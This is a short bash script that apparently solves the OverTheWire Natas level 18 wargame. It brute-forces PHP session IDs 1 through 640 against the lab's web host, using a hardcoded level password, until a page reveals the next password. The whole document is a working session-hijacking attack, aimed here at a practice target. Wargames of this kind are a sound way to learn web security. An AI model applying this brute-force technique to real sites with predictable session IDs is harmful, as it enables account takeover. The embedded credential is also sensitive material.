#!/bin/bash

NATAS_USER=natas18
NATAS_PASS=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

try() {
    id=$1
    curl -s \
        http://$NATAS_USER:$NATAS_PASS@natas18.natas.labs.overthewire.org/index.php?debug=1 \
        -b "PHPSESSID=$id; " | grep -i "debug\|password"
}

#. 
for (( i = 1; i <= 640; i++ )); do
    echo "PHPSESSID: $i"
    r=$(try $i)
    echo $r
    if [[ ! -z $(echo $r | grep -i "password") ]]; then
        break
    fi
done

